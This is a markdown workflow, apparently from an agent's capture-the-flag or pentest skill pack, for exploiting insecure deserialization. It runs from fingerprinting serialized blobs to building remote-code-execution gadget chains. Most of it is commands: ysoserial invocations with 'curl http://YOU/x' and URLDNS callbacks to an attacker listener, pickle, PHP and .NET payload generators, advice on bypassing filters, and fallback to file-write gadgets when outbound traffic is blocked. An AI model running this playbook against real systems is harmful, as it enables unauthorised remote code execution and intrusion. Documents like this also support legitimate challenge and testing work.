# Workflow — the prove-then-weaponize loop

## The rule that saves the budget

**Never fire a gadget chain at an unconfirmed sink.** A gadget that errors
proves nothing — the blob may never have reached a deserializer. The loop:

```
fingerprint → corrupt-and-diff → marker/benign probe → fingerprint lib →
gadget → verify → escalate
```

## Step 0 — locate the blob

```bash
# decode every opaque field — cookie, param, header, body, file
echo -n "$BLOB" | base64 -d | xxd | head -4
# unwrap the second layer (URL→b64→blob is standard)
```

## Step 1 — fingerprint the format

Magic bytes decide the module — see `detection.md` table. `rO0AB`/`aced`→Java,
`O:`/`a:`/`s:`→PHP, `gAN`/`80 03`→pickle, `BAh`→Marshal, `AAEAAAD`/`/wEP`→.NET,
`!!python`/`!ruby/`→YAML, `_$$ND_FUNC$$_`→node-serialize.

```bash
# walk the bytes without running them:
python3 tools/pickle_dis.py blob.pkl        # pickle opcodes
python3 tools/php_ser_parse.py blob.ser     # PHP grammar → JSON
python3 tools/java_ser.py blob.ser          # TC_* tokens → class inventory
python3 tools/msgpack_read.py blob.mp       # msgpack frame + ext types
```

## Step 2 — the corrupt-and-diff probe

```bash
# take the real blob, break its grammar, send it back
python3 tools/web/http_probe.py --challenge "$C" --class web-deserialization \
  --url "$BASE/endpoint" --header "Cookie: user=$CORRUPTED" \
  --evidence-regex 'unserialize|Unpickling|InvalidClass|SerializationException|dump format' \
  --evidence-kind class --on-match confirms --on-miss inconclusive
```

Parser error on YOUR corrupted bytes = deserializer reached → class proves.

## Step 3 — the benign marker / OOB probe

```bash
# Python
python3 tools/pickle_gen.py --marker X1      # → PWNED_X1 benign object
# Java — zero-dependency DNS chain
java -jar ysoserial.jar URLDNS http://x.YOUR-LISTENER/ >urldns.ser
# PHP — a marker object or SoapClient OOB
# .NET — a TypeConfuseDelegate 'nslookup' or an OOB-fetch gadget
```

Callback or marker-in-response = confirmed deserializer, gadget budget opens.

## Step 4 — fingerprint the library version (Java/.NET)

```bash
# probe classes to learn the classpath (GadgetProbe or serialVersionUID leak)
java -jar ysoserial.jar CommonsCollections5 'curl http://YOU/x' >cc5.ser
# if it errors, the exception names serialVersionUID → the lib version
```

## Step 5 — the gadget

```bash
# pick the chain for the measured classpath
java -jar ysoserial.jar <Chain> '<cmd>' >payload.ser
python3 tools/php_ser_gen.py --spec '{...}'
python3 tools/pickle_gen.py --cmd 'id'
ysoserial.exe -g <Gadget> -f <Formatter> -c '<cmd>' -o base64
```

## Step 6 — verify + escalate

- RCE output or OOB flag → done
- gadget errors → library/version mismatch → Step 4 again
- no error, no effect → magic method didn't fire → check `allowed_classes`,
  `find_class` whitelist, `SerializationBinder` → `filter-bypass.md`
- egress dead → file-write gadget (AspectJWeaver, FileUpload1, phar) or
  a second-order store

## The budget map

```
5 probes / 15min per mechanism class
  fingerprint + corrupt-diff + marker = mechanism class "detection"
  one gadget family                  = mechanism class "that chain"
  a different library's chain        = a NEW mechanism class
25 probes / 45min total — then escalate per AGENTS.md ladder
```

## Decision tree — the shortest path

```
blob found
 ├─ magic bytes identified?
 │   ├─ PHP O:/a:  → php-deser.md → php-pop-chains.md → phar-deser.md
 │   ├─ Java aced  → java-deser.md → java-gadgets.md → jndi-injection.md
 │   ├─ pickle gAN → python-deser.md → python-pickle-deep.md
 │   ├─ .NET AAEAAD → dotnet-deser.md → dotnet-gadgets.md → ViewState
 │   ├─ Ruby BAh   → ruby-deser.md → yaml-deser.md
 │   ├─ YAML !!    → yaml-deser.md
 │   ├─ node _$$ND → nodejs-deser.md
 │   └─ other      → other-formats.md
 └─ unknown        → detection.md → corrupt-diff probe
```
